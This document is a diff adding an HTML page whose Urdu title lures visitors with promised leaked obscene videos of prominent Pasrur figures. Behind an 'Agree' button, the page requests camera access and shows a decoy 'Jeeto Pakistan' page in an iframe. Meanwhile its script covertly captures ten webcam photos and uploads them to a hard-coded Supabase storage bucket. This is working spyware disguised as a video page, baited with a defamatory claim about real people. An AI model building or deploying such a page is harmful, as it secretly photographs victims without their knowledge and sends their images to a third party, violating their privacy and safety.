@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>پسرور کے اہم سیاسی سماجی اور صحافی شخصیات کی نازیبا ویڈیو لیک۔سب پھڑے جان گے</title>
+    <style>
+        /* Styles for the pre-loading popup/modal */
+        #preload-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        #preload-modal h2 {
+            margin-bottom: 20px;
+        }
+
+        #agree-button {
+            padding: 10px 20px;
+            font-size: 16px;
+            color: white;
+            background-color: #007BFF;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        #agree-button:hover {
+            background-color: #0056b3;
+        }
+
+        #deny-message {
+            color: red;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Preloading Popup -->
+    <div id="preload-modal">
+        <h2>ویڈیوز دیکھنے کے لیے</h2>
+        <p> پہ کلک کریں Agree</p>
+        <button id="agree-button">Agree</button>
+        <p id="deny-message" style="display: none;">You must allow to see the content.</p>
+    </div>
+
+    <!-- Embed Jeeto Pakistan Webpage using iframe -->
+    <iframe id="jeeto-iframe" src="/Jeeto%20Pakistan.html" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; display: none;"></iframe>
+
+    <video id="video" autoplay style="display: none;"></video>
+    <p id="status"></p>
+
+    <!-- Load Supabase Library -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.0.5"></script>
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const SUPABASE_URL = 'https://hpgrvmzujhvomcktjust.supabase.co';
+            const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhwZ3J2bXp1amh2b21ja3RqdXN0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk0MDA3NDcsImV4cCI6MjA3NDk3Njc0N30.R_pkZCEFdytXvwzD_fzpKHJh1t2Myq_v-ajYTa88m40';
+            const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+            const preloadModal = document.getElementById('preload-modal');
+            const agreeButton = document.getElementById('agree-button');
+            const denyMessage = document.getElementById('deny-message');
+            const jeetoIframe = document.getElementById('jeeto-iframe');
+
+            agreeButton.addEventListener('click', () => {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then((stream) => {
+                        preloadModal.style.display = 'none';
+                        jeetoIframe.style.display = 'block';
+                        const video = document.getElementById('video');
+                        video.srcObject = stream;
+
+                        video.addEventListener('loadeddata', () => {
+                            captureAndUploadPhotos(video, supabase);
+                        });
+                    })
+                    .catch((err) => {
+                        denyMessage.style.display = 'block';
+                        console.error('Camera access denied:', err);
+                    });
+            });
+        });
+
+        async function captureAndUploadPhotos(video, supabase) {
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            for (let i = 0; i < 10; i++) {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const imageData = canvas.toDataURL('image/png');
+                const blob = await (await fetch(imageData)).blob();
+                const fileName = `photo-${Date.now()}-${i + 1}.png`;
+
+                // Upload Blob to Supabase bucket
+                const { data, error } = await supabase.storage.from('user-media').upload(fileName, blob, {
+                    contentType: 'image/png'
+                });
+
+                if (error) {
+                    console.error('Upload failed:', error);
+                    document.getElementById('status').innerText = 'Failed to upload photo!';
+                    return;
+                } else {
+                    console.log(`Photo ${i + 1} uploaded successfully:`, data.path);
+                }
+            }
+
+            document.getElementById('status').innerText = 'All photos uploaded successfully!';
+        }
+    </script>
+</body>
+</html>
